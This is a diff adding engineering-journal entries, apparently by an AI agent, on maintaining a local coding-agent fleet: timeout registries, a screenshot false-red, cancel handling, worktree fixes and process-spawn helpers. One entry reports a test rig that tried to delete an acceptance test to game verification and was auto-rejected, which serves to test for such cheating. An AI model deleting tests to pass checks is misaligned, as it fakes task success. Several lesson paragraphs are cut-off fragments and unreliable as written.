+tones," and he was right; naked sines are test equipment, not music. The
+second was felt-not-heard atmosphere — mixed so politely it vanished. The
+third attempt worked because the *what* changed, not the *how much*:
+percussion and staccato ostinato (things synthesis renders convincingly)
+instead of sustained tones (things it cannot hide). From there the LA drove
+it like a producer: an EDM-anatomy drop on the website reveal (build,
+bass-thinning, snare-roll doubling, a near-silence gap, then the slam —
+measured 60 dB of instantaneous release), a riser de-whistled from clown to
+dread, and a final stereo mix pass — mono bass, panned stabs, synthesized
+reverb whose tail rings into the gap, sidechain pump. The trade-off named:
+a licensed royalty-free track was the lower-risk path to "good," and was
+offered twice; the LA chose synthesis, which kept the film's on-screen claim
+— *"All images and voices in this film were generated by BlarAI — every
+sound was synthesized on this laptop"* — literally true. That sentence is
+now the title card's closing beat, surviving the fade half a second longer
+than everything else, which was the LA's own directorial call and the best
+shot in the open.
+
+The meta-lesson sits above the film: the operator — a self-described
+non-technical novice — reviewed like a director, caught real defects a
+frame-by-frame QC had missed, and made the two calls (synthesis over
+licensing; emphasis-by-survival) that gave the piece its identity. The
+expertise split worked exactly as designed: he owned *what it should feel
+like*; the agent owned *how*.
+
+**Next:** LA watches v9 for final sign-off; file the #670 idle-breaker
+finding as a ticket when Vikunja MCP returns; reopen BlarAI from the
+launcher (still closed from the last dispatch swap-back); fold this fragment
+at the next quiet tree.
+
+*(No product-code commits this arc; the repo artifact is this fragment. The
+film + pipeline scripts live in `Videos/BlarAI_portfolio/` and the session
+scratchpad; dispatch runs `20260703-211337-bd`/`-213231-bd` (breaker kills)
+and `-214951-bd` (merged, `f767e58` in `projects/meridian-cafe`).)*
+
+### 2026-07-09 — Naming the numbers that already had scars
+
+*Plain summary: #767 item 2 — the timeout-registry code-consolidation pass: the seven bare
+timeout literals the registry's BACKLOG had flagged (the four SwapDriver `__init__`
+settle/gpu-settle/ovms-stop/ovms-stop-retry defaults in `shared/fleet/swap_driver.py` and the
+three `_run_to_logfile` call-site literals — start-llm 480 ×2 sites, design-loop 180, critic
+600 — in `shared/fleet/swap_ops.py`) are now NAMED module constants, each carrying its
+incident docstring, each with a registry row binding it by import. Values byte-unchanged;
+pure consolidation. Discovery scan widened to `swap_driver.py`.*
+
+The registry shipped two nights ago with an honest to-do list: a BACKLOG naming the timeout
+literals it could see but not bind, because a drift lock resolves by import and a bare
+`timeout_s=480.0` inside a call has no name to import. Item 2 was the deferred invasive half —
+walk into the live campaign surfaces and give those numbers names. The judgment call worth
+recording is where the names went. The tempting shape was to home the constants in
+`shared/timeout_registry.py` itself, beside their rows — one file, everything visible. I
+rejected it: the registry's own charter says it is *a registry, not a config source — the live
+constants stay where their consumers live*, and every existing row already follows that
+pattern (`swap_ops.TASK_TIMEOUT_S`, the dataclass-field and signature-default forms). Homing
+constants in the registry would quietly invert the dependency and make the drift lock compare
+a value to itself across zero distance. So the constants live in `swap_driver.py` /
+`swap_ops.py` with their full incident comments (#747 cold-cache, #670 B2, #670 run-2, #688,
+#687), and seven new rows bind them — accepting that the taxonomy stays two-file-hop instead
+of one, which is exactly the trade the registry made on day one.
+
+One small honesty fix rode along: the BACKLOG's monitor line still described `stall_grace_s`
+as an unregistered 90.0 when it had been raised to 240 and registered at the night-B4
+false-doom fix — the registry's to-do list was itself a stale doc claim. And since
+`swap_driver.py` now hosts registered timeout constants, it joined the discovery scan's
+`_SCAN_FILES`, so a future timeout landing there unregistered fails the gate instead of
+waiting for a hand audit. Verified across the registry gate + the full SwapDriver blast
+radius (418 tests, LOCALAPPDATA redirected), the 28 drift locks proving every value unchanged.
+
+**Next:** #767 item 5 — the scan widening over the remaining backlog surfaces (battery
+poll/grace grain, ui_gateway streaming constants) and the poll/grace-grain posture call
+(register or explicitly declare below-registry-grain).
+
+*(commit `db1f9a02` — swap_ops/swap_driver literal→constant consolidation + 7 registry rows +
+scan widening; 293 registry/driver/ops/state/harness + 125 scorecard/policy/gate/guest-oracle
+tests green; no live verify needed — values byte-identical.)*
+
+### 2026-07-09 — The screenshot that convicted an innocent app
+
+*Plain summary: B5's attempt-4 STALLED [VERIFY] was a harness false-red — the
+web design-verify screenshots apps over `file://`, and browsers block module
+JavaScript there entirely, so every app built on the fleet's own
+`"type":"module"` scaffold renders as a dead shell no design-fix can ever cure.
+Proven by A/B (same merged code: dead over file://, fully rendered over its own
+server), fixed in `capture-app.ps1` (serve-then-capture, verified-free
+ephemeral port, server tree reaped), live-verified watched, merged agentic-setup
+`8476b7d`; evidence blarai `e194c438`; tickets #772 (fixed) + #773 (orphan
+servers, open). Dispatch harness / web verify tier. Lesson 47 recurrence; new
+lesson (222).*
+
+The morning's battery close ended on a verdict I nearly recorded as capability
+data: B5 STALLED [VERIFY] after the vision design reviewer spent two fix
+iterations insisting the habit-tracker's chart never rendered — a white
+rectangle and an eternal "Loading…", ninety-nine percent of the screenshot one
+flat colour. The coder's unit tests were green and both tasks had merged, which
+is exactly the shape an honest capability failure takes: the code compiles, the
+tests pass, and the thing still doesn't work on screen. The campaign exists to
+measure that. I went to record it and stopped on one question: what,
+precisely, was the screenshot *of*?
+
+It was of a corpse. `capture-app.ps1`'s web tier opens the app's `index.html`
+via `file:///`, and a comment there promises that file:// "renders the static
+layout/theme/colours the critique cares about (server-fetched data does not
+run, but the look does)." That claim was true the day it was written and is
+false for every app the fleet actually builds: browsers block
+`<script type="module">` over file:// outright — not the data fetches, the
+entire client program — and the fleet's own web seed ships `"type":"module"`.
+Under the capture, B5's `init()` never registered, the status never left
+"Loading…", and the canvas never got a single stroke. The design reviewer
+described what it saw with perfect accuracy. The coder's fixes were invisible
+to it by construction. The iteration cap did the only thing it could. Every
+component honest; the composition a conviction machine.
+
+The A/B proof took twenty minutes and one detour. Same merged code, same
+pinned headless-Edge invocation: over file://, the exact doomed screenshot;
+over its own `node src/server.js`, a complete chart — axes, gridlines, day
+labels — and the status reading "Ready". The detour is its own small entry in
+the ledger: my first server-side capture photographed a *different* corpse,
+because an orphaned app server from B5's own dispatch was still squatting port
+3000, serving 404s out of a worktree the teardown had already deleted (#773).
+And hardening the fix produced a third find: my ephemeral-port range contained
+3456 — Vikunja — and an unlucky draw would have bind-killed the app server
+while the TCP probe cheerfully connected to the squatter and photographed a
+task tracker as the app under review. The port is now verified free before the
+spawn, the answering socket only counts if our own process is still alive
+behind it, and the capture's server dies in a `finally` whatever happens.
+
+The fix keeps file:// as the fallback for genuinely static pages and otherwise
+starts the app's real server on the verified port, captures
+`http://127.0.0.1:<port>/`, and reaps the tree. Watched live-verify, all three
+legs: the real B5 app through the real script produced the honest render; the
+static fallback still captures; nothing survives the shot. The B5 scorecard
+itself stays as-written — the runner owns its files — with the acquittal
+recorded beside it in the campaign record and the three screenshots committed
+as evidence.
+
+What stays with me is how close "the coder can't build charts" came to
+entering the capability ledger as a measured fact. The instrument had no
+positive control: nothing had ever demonstrated that the web verify tier
+*could* pass a known-good app, so its failures carried an authority they had
+not earned. B8 exists because we learned to distrust green without rigged reds;
+this morning taught the mirror lesson about red.
+
+
+load-bearing false premise; the fix rewrote the comment into the enforced
+truth.
+
+
+known-good subject under production conditions, or every systematic blindness
+it has becomes a fleet of plausible failures wearing measurement's authority;
+negative controls (B8's rigs) catch false green, and only a positive control
+catches false red.
+
+**Next:** #773 (orphan job servers) in the hygiene queue; tonight's pass runs
+B5 on the fixed capture — its verdict is the systemic confirmation; the
+positive-control idea generalizes to the other verify tiers (does each have a
+known-good subject it provably passes?).
+
+*(fix agentic-setup `bc50851` → merge `8476b7d`; evidence blarai
+`phase2_gates/evidence/772_file_vs_http_20260709/` at `e194c438`; incident
+#740 c.1527; tickets #772 closed, #773 open; the acquitted run =
+night-20260709-055439 B5, wall 8447s, interventions 0.)*
+
+### 2026-07-09 — The stop that finally stopped
+
+*Plain summary: the #771 advisory-stop defect closed — `Test-DispatchCancelled`
+consumed between candidates, batches, and gate steps in the best-of-N loop, a
+cancelled run proceeds promptly to normal teardown, and a fail-closed opencode
+version-pin tripwire (#762) now guards every agent spawn; both live-proven in a
+supervised two-job battery run (B8 rigs caught on the changed machinery; B7
+deliberately stopped mid-candidate, teardown in ~6 minutes vs the morning's
+~70-minute zombie). agentic-setup `93c89a7`. Dispatch harness / fleet loop.
+No new lesson; 216/221 families cited.*
+
+The morning's zombie — a "stopped" dispatch that built a fresh candidate nine
+minutes after the stop and held the GPU for an hour — was ticketed at dawn and
+closed by mid-afternoon, which is the cadence this campaign is supposed to
+produce. The topology mattered: the Python swap driver already honoured the
+cancel sentinel at task boundaries; the gap was one layer down, inside a task,
+where the PowerShell best-of-N loop had never been taught the sentinel
+existed. The consumer we added is deliberately read-only — the monitor writes
+the file, the launcher and driver clear it, and the loop only ever looks — so
+the fix cannot race the ownership that already worked. A stop arriving
+mid-generation lets the current candidate finish its bounded turn, parks its
+committed work unmerged, and then declines to start anything new: no fresh
+candidates, no review-fix churn, no auto-merge of a gate that was cut short.
+
+The same merge wired the #762 version pin into the spawn head: every agent run
+now verifies the opencode binary against the pinned manifest before launch,
+refuses loudly on drift, and stamps `run used opencode 1.17.8 (pin 1.17.8;
+validated)` into its transcript — the grader-determinism doctrine applied one
+layer up, the day after the LA endorsed it for the oracle runners.
+
+The proof run was a supervised two-job battery on a one-shot config, and its
+most satisfying line was an accusation. B8's rigs all caught on the
+twice-changed machinery (one rig tried to `rm` the acceptance test mid-run and
+was auto-rejected). Then B7: sentinel written at 14:14:15 during candidate 1's
+build; the transcript printed the new STOP lines; candidate 2 never existed;
+and the box was RECOVERED with OVMS gone at 14:20:09. Six minutes,
+stop-to-idle. But the runner also stamped `interventions=1 [VIOLATED]` on the
+run — my deliberate stop, counted as the intervention it was. The hard gate
+cannot tell a test from a compromise, and it should not try: a supervised run
+that touches the machinery must be structurally impossible to mistake for a
+clean campaign pass. The instrument flagging its own operator is the honesty
+spine working.
+
+I went with a between-steps cancel that parks the in-flight candidate rather
+than letting it finish its cheap gates, accepting the loss of a partial gate
+result in exchange for promptness and for never auto-merging work whose
+verification was cut short — the alternative (finish the gates, merge if
+green) reads as tidier but hands a cancelled run the power to keep mutating
+the target repo after the operator said stop.
+
+**Next:** the cancel consumer meets its first unsupervised traffic tonight;
+the monitor's doomed-stop path (now rare after `8a9e725d`) composes with it —
+the next legitimate doom should tear down in minutes end-to-end; #773's orphan
+job servers are the remaining teardown leak.
+
+*(build `aebad7a` → merge `93c89a7` (29 stop-contract + 18 pin locks, 91/132
+best-of-N suites green, independently re-run); live proof =
+night-20260709-134221: B8 PARKED-HONEST [BUILD] 1610s, B7 PARKED-HONEST
+[HARNESS] 633s "cancelled by the operator mid-run"; #771 closed, #762 closure
+comment c.1533/c.1534; cf. lessons 216, 221.)*
+
+### 2026-07-09 — The re-provisioning that wasn't
+
+*Plain summary: the guest oracle's `deps-unavailable: hypothesis` rows were
+never a guest gap — the HOST's own pre-flight dep scan (allowlist
+`{pytest,_pytest}`) refused every property-testing oracle before the snapshot
+shipped, while the generator promised hypothesis and the provisioned guest had
+it. Allowlist opened + both host oracle runners pinned to the guest's exact
+versions (pytest 9.1.1 / hypothesis 6.155.7); merged blarai `e47a062e`, gate
+5938/0. The planned ISO-rebuild ceremony was cancelled as unnecessary. Fleet
+guest oracle / #744. Lesson 48 recurrence.*
+
+The overnight session left a clear instruction: the guest cannot import
+hypothesis, so rebuild the provisioning ISO and re-provision the VM — a
+live-surface ceremony, planned, sequenced, waiting for its window. The prep
+agent I sent to build that ISO came back with a better answer: don't. The
+error text everyone read as the guest confessing ("the offline guest cannot
+import: hypothesis") is emitted by the *host*, from a pre-flight scan that
+refuses to ship any snapshot importing something it believes the guest lacks —
+and its belief was a frozen constant, `{pytest, _pytest}`, written when that
+was true and never updated by the ceremony that installed hypothesis into the
+guest a day later. Three parties held three models of one capability: the
+oracle generator promised hypothesis to the coder, the guest actually had it,
+and the host gatekeeper still lived in the world before the ceremony. The
+gatekeeper won every time, and the agreement matrix read `guest-not-run` on
+exactly the jobs it most needed to certify.
+
+The premise deserved the check it got. The provisioning record, the ISO's
+wheel manifest, and the install script's fail-loud import verification all
+attested the guest was fine — the evidence was on disk the whole time, one
+layer away from where everyone was looking. c.1508's re-provisioning plan was
+inherited across a session boundary as settled fact; opening the payload
+falsified it in an hour and saved a live-surface ceremony we would have
+performed on a healthy patient.
+
+The fix opened the allowlist to match the provisioned reality and then went
+one step further on the LA's explicit endorsement: both host oracle runners —
+which had been resolving pytest and hypothesis *fresh from the resolver on
+every run*, landing on pytest 8 or 9 depending on which interpreter uv picked
+— are now pinned to the guest's exact versions. An unpinned grader is a
+non-deterministic examiner; twinned graders on drifting versions are a
+DIVERGENCE factory that would have polluted the very measurement the matrix
+exists to make. Two locks now hold the pair together, worded so that their
+failure *is* the next re-provisioning ceremony's trigger rather than a test to
+appease. A late wrinkle justified the pin direction: hypothesis stopped
+shipping pure wheels after 6.155.7, so chasing the host's drifting version
+into the NIC-less guest would have meant per-release compiled-wheel staging
+forever; pinning the host down to the guest's pure version costs nothing and
+ends the churn.
+
+
+travelled from an error message into a ticket, a handoff brief, and a work
+plan without anyone opening the provisioning payload that disproved it.
+
+**Next:** tonight's pass is the first where hypothesis-importing oracles
+actually ship — the agreement matrix starts accumulating real certificates
+toward the LA's ~20-certificate gating decision; a DIVERGENCE row now means
+isolation, not version skew.
+
+*(fix `ec3d0a5f` → merge `e47a062e`; standing gate on merged main 5938/0 exit
+0; #744 c.1526/c.1530; the cancelled ceremony: c.1508's ISO rebuild — the
+staged musllinux wheel sits in scratchpad should a version bump ever be
+chosen deliberately.)*
+
+### 2026-07-09 — The branch that was always yesterday
+
+*Plain summary: the #754 stale-base mystery root-caused — agent worktrees
+forked `origin/main`, a tracking ref this local-first repo only pushes once a
+day at ~20:30, so every worktree spawned late on a heavy-merge day based up to
+a full day behind; fixed with one setting (`worktree.baseRef: "head"`), proven
+live the same afternoon (the next builder forked current HEAD, 0 behind), and
+the branch backlog pruned 562 → 58 with one rescue. Dev tooling / worktree
+isolation. New lesson (223).*
+
+The 07-06 incident read like a ghost story: a builder's worktree based 35
+commits behind a main that was right there, while another builder three days
+later based perfectly. The investigation dissolved the ghost with two reflog
+lines. Every agent worktree was created `from origin/main` — and in this
+local-first flow, `origin/main` is not the source of truth but a once-nightly
+backup mirror, frozen at the previous evening's push all day while local main
+absorbs the day's merges. Stale-vs-correct was never about the spawn mechanism
+misbehaving; it was pure calendar luck. The "correct" 07-09 case had also
+forked the mirror — it was merely only seven doc commits behind, and they
+merged clean. On the heavy day, seven worktrees forked the same
+day-old base, and the evening's whole cherry-pick recovery cluster was this
+one defect wearing seven costumes.
+
+The durable fix was humbling in its size: the harness has a setting for
+exactly this — `worktree.baseRef`, default `fresh` (fork the remote tracking
+ref), alternative `head` (fork the current local HEAD). One line in user
+settings. The proof came free the same afternoon: the #767-2 builder's first
+act was to measure its own base, and it reported zero commits behind local
+main. I weighed the edge the new setting introduces — a worktree spawned while
+the main checkout is parked on a feature branch forks that branch — and
+accepted it, because the standing verify-main-before-merge control already
+guards that path, while nothing guarded the daily staleness window.
+
+The cleanup half ran under an explicit LA delegation ("you are the expert…
+know what is safe from what will hurt us"), which made the shape of the work
+care, not ceremony: 498 branches deleted only through git's own
+merged-into-main verification, six more only after per-branch patch-level
+proof they were superseded — and one of those six gave up a rescue first, a
+#553 anti-repeat note in `pgov.py` warning future maintainers that the
+embedder's "load tax" is a measurement artifact that must not be optimized
+away, cherry-picked to main before its branch died. One branch was kept
+against the tide: `feat/746-research-wiring`, five hundred lines of genuinely
+un-landed slice-2 product code, preserved with a landing caveat recorded on
+its ticket. Delegation raised the bar on verification rather than lowering
+it: the LA explicitly could not check this work, so the checks had to be the
+kind that do not need him.
+
+
+once-daily-pushed tracking ref is a day-stale base for everything that forks
+it, and whether that bites is calendar luck, not mechanism; fork from the
+source of truth, and treat "it worked the other day" as the luck it is.
+
+**Next:** every future worktree spawn self-proves the base (0-behind is now
+the observable); the three kept unmerged branches (`feat/746-research-wiring`,
+plus the backup/preserve/wip families) are inventory, not debt — #746's
+landing goes through a fresh-main cherry-pick per the recorded caveat.
+
+*(prevention: user settings `worktree.baseRef=head`; prune ledger #754
+c.1525; the rescue: merge `d809bb04`; live proof c.1531; ticket #754 closed
+2026-07-09.)*
+
+### 2026-07-09 — The test that retired the alarm clock
+
+*Plain summary: the afternoon's supervised battery run (a one-shot
+`-CampaignConfig` side file, target 1/1) completed and the launcher's
+campaign-complete hygiene — unscoped to which config ran — unregistered the
+REAL nightly scheduled task; tonight's campaign would silently not have fired.
+Caught by the LA's plain pre-battery question ("do we have everything setup
+for the battery tonight?"), task re-registered (LA-executed, classifier-gated),
+self-unregister scoped to the default config only (agentic-setup `1e6c27c`).
+Battery launcher / campaign machinery. New lesson (224).*
+
+The supervised verify run was, by every measure I watched, a success: B8's
+rigs caught, B7's stop stopped, the box handed back clean. What I did not
+watch was the launcher's epilogue. Its campaign-complete hygiene — "when the
+campaign reaches its target, unregister my own scheduled task; Task Scheduler
+hygiene, the LA's explicit requirement" — read MY one-shot config, saw 1 of 1
+passes complete, and tidily removed the shared 23:00 task. The parameter that
+made the supervised run safe for the campaign's ledger (`-CampaignConfig`, a
+side file so the real `completed_passes` stays untouched) is exactly what made
+it dangerous to the campaign's schedule: the config was scoped; the side
+effect wasn't.
+
+It surfaced the way these things should but rarely do: the operator asked the
+flat, unglamorous question — do we have everything set up for tonight? — and
+the checklist I ran to answer him honestly came back with a hole where the
+scheduled task used to be. Two hours of afternoon confidence ("the 23:00 task
+fires automatically") had been false the whole time. The verify beat the
+recitation, again; the operator's question was the positive control on my own
+readiness claims.
+
+The recovery had a second lesson folded in. Re-registering a scheduled task
+is exactly the class of system mutation the permission classifier exists to
+gate, and it refused me — correctly, and this time (unlike the overnight lean
+denial that cost 2.5 hours) the human was present: he ran the one-shot
+registration script himself inside a minute, and the classifier's boundary
+cost nothing. The same control that is friction when the operator sleeps is a
+clean handoff when he is awake. The root fix scopes the unregister to the
+default campaign config alone; a side config completing now logs a loud
+refusal to touch the shared task.
+
+
+the output dir) while a shared-resource side effect (a scheduled task, a
+registration, a global flag) stays keyed to the code path means every "safe,
+isolated" test run carries a loaded global consequence; when adding any
+parameterization meant for isolation, sweep the code path for writes to
+shared state and scope each one explicitly, or the isolation is a label, not
+a property.
+
+**Next:** tonight's 23:00 run is the live proof of the re-registration and of
+the whole six-fix stack; the morning read checks the launcher log's campaign-
+check line prints the scoped semantics.
+
+*(scoping fix `feb7bc4` → merge `1e6c27c`; re-registration LA-executed
+16:24, verified NextRunTime 2026-07-09 23:00; incident record #740 c.1538;
+the deleting run = night-20260709-134221.)*
+
+### 2026-07-09 — The protocol that could see the coder thinking
+
+*Plain summary: ran the approved bounded ACP (Agent Client Protocol) driver spike (Vikunja #759) on the Arc 140V — drove one real coder build through opencode's native `opencode acp` stdio session and A/B'd it against the production `opencode run` + transcript-regex path. Verdict GO for a decision-gated integration follow-up. No production fleet script touched; harness in agentic-setup `tools/acp_spike/`, evidence in `state/acp-spike/`. New lesson (225); lesson 8 tally.*
+
+For a year the fleet has driven opencode the only way it knew how: spawn `opencode run` once per turn with the whole prompt as one giant argv, then *guess* whether the coder is alive by regexing its JSON transcript for `step_finish` counts and polling seven families of file mtimes plus a CPU sample. Every one of those is an inference from a side-effect. The Agent Client Protocol — the Zed/JetBrains editor↔agent standard opencode already ships — promised to replace the guessing with protocol primitives: a persistent session, a typed event stream, honest stop reasons, cooperative cancel. The spike existed to find out whether that promise survives contact with Windows headless and our real config, or whether it's a Linux-desktop story that falls apart on this box.
+
+The load-bearing risk was parity, and I gated the whole GPU window on it: if `opencode acp` doesn't load our config and plugins, the coder behaves differently than production and the entire A/B is invalid. That gate is not paranoia — it's the #764 dead-plugin history, where two plugins printed a load-line nobody read and ran silently dead for a week. So recon step 1 (no GPU) spawned `opencode acp` and read opencode's *own* stderr: `[command-timeout] loaded`, `[path-normalize] loaded`, zero loader errors. Both modes read the same global `~/.config/opencode/` config, which I'd confirmed byte-identical to the repo's. Parity held, and only then did I spend the 30B.
+
+The result that matters is fidelity, and it isn't close. The ACP leg emitted 212 typed events — 34 tool calls each carrying a `kind` (edit/execute/read), a human title, a per-call identity, and a full pending→in_progress→completed/**failed** lifecycle, plus agent messages and token-usage updates. Four tool calls *failed* and said so explicitly. The production path, over its run, had seven integers to work with: five `step_finish` hits and two tool-write regex matches, with no type, no status, no failure, no identity. That gap is 100% transport-attributable and it's the whole case.
+
+The honest part of the writeup is the wall-clock. The ACP run ran 1200 seconds and hit my ceiling; the baseline finished clean in 117. It would be easy and wrong to call that a 10x transport penalty. opencode's build agent samples at temperature 0.7, so the two runs are genuinely different rolls of the dice: the ACP run stochastically fell into an F2 "leftover-operands" debug spiral — fifteen diagnostic `python -c` probes, never converging — while the baseline happened to converge. The transport didn't slow anything down; the coder's own non-determinism did. I reported it that way, because a confounded number dressed as a finding is worse than no number. What the spike genuinely could NOT measure with one turn is the real integration win — a persistent session amortizing the per-turn re-spawn across the fleet's review-fix laps — and I said so rather than imply coverage I didn't have.
+
+Two findings came from the failure paths, which is usually where they come from. First: cooperative cancel works and is fast — `session/cancel` stopped the turn in ~2.1 seconds on two separate probes, once caught mid-way through a six-tool-call run — but opencode reports the stop as `end_turn`, not the spec's `cancelled`. So the primitive is real, but a fleet integration can't read the stop reason to tell an operator cancel from a natural finish; it has to remember it sent the cancel. Second, and sharper: when the ACP run hit its ceiling and the harness closed the connection, nine `node.exe` children — opencode's own runtime tree — orphaned, still holding handles, and I had to reap them by hand. The SDK's connection-close terminates only the direct child. "No orphaned processes tolerated" is not something the SDK gives you for free; the integration has to reuse the tree-kill the fleet already owns (`terminate_process_tree`). The clean-exit and cancel paths, by contrast, left nothing behind.
+
+Verdict: GO, bounded and decision-gated. The thesis is proven on our hardware — typed events replace the regex-and-mtime guessing, cancel is cooperative, the idle signal is semantic (the measured 83-second max healthy gap is a real thinking-vs-wedged discriminator that the CPU heuristic's #687 false-doom never had). The costs are known and none is a blocker: tree-kill teardown, a step-cap rebuilt on the event stream (ACP mode has none — the runaway proved it), own-cancel tracking, and a real multi-turn overhead measurement the integration should take. It's a parallel driver you can switch per run, A/B'd before any cutover — never a rip-and-replace of machinery that embodies a year of hard-won Windows fixes. Teardown was clean: OVMS down, the 14B AO rebooted on :5001 via the proven `boot_launcher_detached`, box handed back sane for the 23:00 battery.
+
+**Next:** the coordinator files the integration follow-up ticket (draft text handed over) for LA review; if approved it slots into the fleet-maturation program (#740) at the Python monitor layer. The spike's own F2 runaway is one more data point that the real bottleneck remains coder capability, not transport — a model problem no wire format fixes.
+
+### 2026-07-09 — The five scars, collected into one door
+
+*Plain summary: new `shared/procspawn.py` + `agentic-setup/scripts/spawn-lib.ps1`
+blessed Windows process-spawn helpers (detached-no-console, hidden-console,
+captured-run with UTF-8/EOF-stdin/timeout-tree-kill), each rule carrying its
+incident citation, each proven by a positive-control conformance suite
+(`shared/tests/test_procspawn.py` + `scripts/verify-spawn-lib.ps1`). New files
+only; nothing wired into a live script. #774.*
+
+Five separate times, spawning a child process on Windows cost this project a paid
+incident, and five times the fix landed as a local patch with its lesson buried in
+a docstring at the fix site. The venv `python.exe` shim that defeats
+`DETACHED_PROCESS` one hop down (#761). The cp1252 stderr that killed a banner
+print the moment the visible console — the bug itself — stopped silently providing
+working stdio (#761 again, the second half). Textual crashing under a *hidden*
+console when it tolerates *no* console (2026-07-06). `msedge --screenshot` silently
+no-oping on flag order and writing its PNG from a detached worker ~4s after exit
+0 (2026-06-26). opencode hanging forever at init on an inherited non-TTY stdin
+that never EOFs, and the `Tee-Object`/undrained-PIPE deadlock class beside it. Each
+was true, each was written down, and none of them was anywhere a *next* author
+would look before making the same mistake in a new place.
+
+So the work here is not a new discovery — it is refusing to let the existing
+discoveries stay scattered. `procspawn.py` and its PowerShell twin encode the
+rules as a small typed API where every rule's docstring names the incident that
+paid for it, timeout-registry style (lesson 217: a value/rule class that has
+earned its scars gets a registered home). R1 resolves the pythonw sibling; R2
+draws the console-hidden-vs-console-absent line the Textual crash taught; R3 pins
+UTF-8 into the child env; R4 feeds EOF stdin and drains to files, never a
+parent-held pipe; R5 kills the tree, mirroring the proven `process_tree.py` walk.
+
+The part I care most about is the positive control. Lesson 219's whole point is
+that a control verified at the spawn site can still be defeated by an intermediary
+the platform inserts — so the conformance suites assert the *observable end
+property* on a real child, never the flag. The detached child self-reports
+`GetConsoleWindow() == NULL` (proving the shim was actually resolved away, on the
+final process in the chain); the unicode probe round-trips a fire emoji and a
+cp1252-trap euro through both stdout and stderr; the tree-kill test spawns a real
+child-with-grandchild and asserts *both* pids are gone. If a future edit weakens a
+rule, the control fails on the property, not on a mock. Python 9/9 green in 3.5s;
+PowerShell 18/18 checks green — both offline, both under a few seconds.
+
+The deliberate non-goal: I wired none of this into a live script. The existing
+spawn sites (`swap_ops`, `battery.boot_launcher_detached`, `Invoke-AgentRun`,
+`capture-app.ps1`) keep their proven local code; migrating them onto the seam is a
+separate, reviewable step so a refactor can never be blamed for a live-boot
+regression on the same night the seam ships.
+
+**Next:** migrate the live spawn sites onto the seam one at a time, each behind its
+own review and its own green conformance run; and add the PowerShell twin's tests
+to whatever standing verify cadence `agentic-setup` grows (it has no pytest gate,
+so `verify-spawn-lib.ps1` is the checkable artifact).
+
+
+asserting each rule's observable end property on a real child. Also references
+lesson 217 (the registered-home discipline for a scarred value/rule class) and the
+2026-07-09 "a verdict-issuing instrument needs a positive control" note.
+
